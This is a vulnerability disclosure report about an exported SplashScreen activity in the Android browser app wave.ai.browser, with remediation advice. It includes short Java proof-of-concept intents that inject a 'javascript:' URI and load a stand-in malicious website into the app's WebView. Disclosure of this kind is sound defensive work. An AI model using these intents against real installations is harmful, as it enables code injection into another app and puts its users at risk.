## Vulnerability Report: Arbitrary Code Execution via Exported `SplashScreen` Activity in `wave.ai.browser`

### Overview:

The `wave.ai.browser` application version 1.0.38 contains a manifest entry that exports the `wave.ai.browser.ui.splash.SplashScreen` activity. This exported activity permits unauthorized applications to start it with arbitrary intent data & can lead to arbitrary code execution within the context of the `wave.ai.browser` application.

### Detailed Description:

An exported activity is one that can be invoked by other applications on the device. If not properly protected or if it implicitly trusts the data it receives, this can pose a security risk.

Given the manifest entry:
```xml
<activity android:theme="@style/Theme.App.Splash" 
          android:name="wave.ai.browser.ui.splash.SplashScreen" 
          android:exported="true" 
          android:launchMode="singleTop" 
          android:screenOrientation="portrait">
</activity>
```

The `wave.ai.browser.ui.splash.SplashScreen` activity is exported, meaning any third-party application can start this activity.

This activity uses a WebView component to display web content and doesn't adequately validate or sanitize the URI or extra data passed in the intent. 

Therefore a malicious app could craft an intent to load a website or execute arbitrary JavaScript within that WebView.

### POC:


![wave_ai_uri](https://github.com/actuator/wave.ai.browser/assets/78701239/cc22e955-a306-440c-8b92-00fdfc705717)




#### Malicious Intent Creation:
In a malicious app:
```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("wave.ai.browser", "wave.ai.browser.ui.splash.SplashScreen"));
intent.setData(Uri.parse("javascript:malicious_code_here"));
startActivity(intent);
```


If the `SplashScreen` activity in `wave.ai.browser` loads URIs in this manner without checking or sanitizing them, the malicious JavaScript code would execute within the context of the `wave.ai.browser` app or load an arbitrary website.

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("wave.ai.browser", "wave.ai.browser.ui.splash.SplashScreen"));
intent.setData(Uri.parse("http://maliciouswebsitetest.com/"));
startActivity(intent);
```

### CWE References:

CWE-94: Improper Control of Generation of Code ('Code Injection'): The vulnerability can potentially allow attackers to inject arbitrary code.

### Recommendations:

1. **Limit the Export of Activities**: Unless there's a compelling reason, avoid exporting activities. If you must export an activity, use intent filters and permissions to restrict who can start the activity.
2. **Validate and Sanitize Intent Data**: Always validate and sanitize data obtained from intents before use. Never trust data from external sources.
3. **Secure WebView Settings**: If using WebView, disable JavaScript unless necessary. Always sanitize and validate URLs and data passed to the WebView.

### Conclusion:

The manifest configuration of `wave.ai.browser` exposes it to potential arbitrary code execution risks.
